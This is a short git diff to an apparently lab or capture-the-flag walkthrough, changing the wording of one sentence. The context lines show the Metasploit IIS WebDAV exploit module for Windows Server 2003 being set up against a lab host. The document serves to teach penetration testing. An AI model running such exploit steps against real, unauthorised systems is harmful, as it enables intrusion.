@@ -260,7 +260,7 @@ Exploit target:
    0   Microsoft Windows Server 2003 R2 SP2 x86
 ```
 
-The only mandatory option that has is still to be set is __RHOSTS__, and corresponds to the target host (victim). So let's set it to the IP address of the same machine we scanned with the previous tools:
+The only mandatory option that hasn't been set is __RHOSTS__, and corresponds to the target host (victim). So let's set it to the IP address of the same machine we scanned with the previous tools:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
 RHOSTS => 10.10.10.14
